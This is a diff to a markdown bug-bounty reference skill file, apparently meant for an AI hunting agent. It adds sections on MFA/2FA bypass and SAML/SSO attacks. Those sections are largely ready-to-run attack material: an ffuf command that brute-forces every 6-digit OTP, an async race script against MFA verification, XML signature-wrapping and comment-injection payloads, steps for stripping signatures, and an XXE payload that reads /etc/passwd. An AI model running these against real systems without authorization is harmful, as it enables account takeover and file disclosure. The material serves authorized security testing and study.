@@ -1,6 +1,6 @@
 ---
 name: web2-vuln-classes
-description: Complete reference for 18 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS, SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10 agentic framework), API misconfig, ATO taxonomy, SSTI, subdomain takeover, cloud/infra misconfigs, HTTP smuggling, cache poisoning. Use when hunting a specific vuln class or studying what makes bugs pay.
+description: Complete reference for 20 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS, SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10 agentic framework), API misconfig (mass assignment, JWT attacks, prototype pollution, CORS), ATO taxonomy (9 paths), SSTI (Jinja2/Twig/Freemarker/ERB/Spring), subdomain takeover, cloud/infra misconfigs, HTTP smuggling (CL.TE/TE.CL/H2.CL), cache poisoning, MFA bypass (7 patterns), SAML attacks (XSW/comment injection/signature stripping). Use when hunting a specific vuln class or studying what makes bugs pay.
 ---
 
 # WEB2 BUG CLASSES — 18 Classes
@@ -655,4 +655,178 @@ Right-click → Extensions → Param Miner → Guess headers
 ```bash
 curl -s -I https://target.com/account | grep -i "cache-control\|x-cache\|age"
 # If: no Cache-Control: private + x-cache: HIT → cacheable private data
+```
+
+---
+
+## 19. MFA / 2FA BYPASS
+> Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.
+
+### Pattern 1: No Rate Limit on OTP
+```bash
+# Test with ffuf — all 1M 6-digit codes
+ffuf -u "https://target.com/api/verify-otp" \
+  -X POST -H "Content-Type: application/json" \
+  -H "Cookie: session=YOUR_SESSION" \
+  -d '{"otp":"FUZZ"}' \
+  -w <(seq -w 000000 999999) \
+  -fc 400,429 -t 5
+# -t 5 (slow down) — aggressive rates get 429 or ban
+```
+
+### Pattern 2: OTP Not Invalidated After Use
+```
+1. Login → receive OTP "123456" → enter it → success
+2. Logout → login again with same credentials
+3. Try OTP "123456" again
+4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
+```
+
+### Pattern 3: Response Manipulation
+```
+1. Enter wrong OTP → capture response in Burp
+2. Change {"success":false} → {"success":true} (or 401 → 200)
+3. Forward → if app proceeds → client-side only MFA check
+```
+
+### Pattern 4: Skip MFA Step (Workflow Bypass)
+```bash
+# After entering password, app sets a "pre-mfa" cookie → redirects to /mfa
+# Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie
+# If app grants access without MFA = auth flow bypass = Critical
+curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
+```
+
+### Pattern 5: Race on MFA Verification
+```python
+import asyncio, aiohttp
+
+async def verify(session, otp):
+    async with session.post("https://target.com/api/mfa/verify",
+                            json={"otp": otp}) as r:
+        return r.status, await r.text()
+
+async def race():
+    cookies = {"session": "YOUR_SESSION"}
+    async with aiohttp.ClientSession(cookies=cookies) as s:
+        # Send same OTP simultaneously from two browsers
+        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
+        print(results)
+asyncio.run(race())
+```
+
+### Pattern 6: Backup Code Brute Force
+```
+Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
+BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
+Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
+```
+
+### Pattern 7: "Remember This Device" Trust Escalation
+```
+1. Complete MFA once on Device A (attacker's browser)
+2. Capture the "remember device" cookie
+3. Present that cookie from a new IP/browser
+4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
+```
+
+### MFA Chain Escalation
+```
+Rate limit bypass + no lockout = ATO (Critical)
+Response manipulation = client-side only check = Critical
+Skip MFA step = auth flow bypass = Critical
+OTP reuse = persistent session hijack = High
+```
+
+---
+
+## 20. SAML / SSO ATTACKS
+> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.
+
+### Attack Surface
+```bash
+# Find SAML endpoints
+cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
+# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
+```
+
+### Attack 1: XML Signature Wrapping (XSW)
+```xml
+<!-- BEFORE: valid assertion by user@company.com -->
+<saml:Response>
+  <saml:Assertion ID="legit">
+    <NameID>user@company.com</NameID>
+    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
+  </saml:Assertion>
+</saml:Response>
+
+<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
+     App processes the FIRST assertion found = evil. -->
+<saml:Response>
+  <saml:Assertion ID="evil">
+    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
+  </saml:Assertion>
+  <saml:Assertion ID="legit">
+    <NameID>user@company.com</NameID>
+    <ds:Signature><!-- Valid --></ds:Signature>
+  </saml:Assertion>
+</saml:Response>
+```
+
+### Attack 2: Comment Injection in NameID
+```xml
+<!-- XML strips comments before passing to app -->
+<NameID>admin<!---->@company.com</NameID>
+<!-- Signature computed over: "admin@company.com" (with comment) -->
+<!-- App receives: "admin@company.com" (comment stripped) -->
+<!-- Works when signer and processor handle comments differently -->
+```
+
+### Attack 3: Signature Stripping
+```
+1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
+2. Delete the entire <Signature> element
+3. Change NameID to admin@company.com
+4. Re-encode: cat saml.xml | gzip | base64 -w0 (or just base64 -w0)
+5. Submit — if server doesn't verify signature presence = admin ATO
+```
+
+### Attack 4: XXE in SAML Assertion
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<saml:Assertion>
+  <NameID>&xxe;</NameID>
+</saml:Assertion>
+```
+
+### Attack 5: NameID Manipulation
+```
+Test these NameID values:
+- admin@company.com (generic admin)
+- administrator@company.com
+- support@target.com
+- Any email found in disclosed reports for this program
+- ${7*7} (SSTI if NameID gets rendered in a template)
+```
+
+### Tools
+```bash
+# SAMLRaider (Burp extension) — automated XSW testing
+# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab
+
+# Manual workflow:
+echo "BASE64_SAML" | base64 -d > saml.xml
+# Edit saml.xml
+base64 -w0 saml.xml  # Re-encode
+# URL-encode the result before sending as SAMLResponse parameter
+```
+
+### SAML Triage
+```
+XSW successful   = Critical (ATO any user)
+Sig stripping    = Critical (ATO any user)
+Comment injection = High (ATO admin)
+XXE in assertion = High (file read / SSRF)
+NameID manip     = Medium/High (depends on what NameID maps to)
 ```
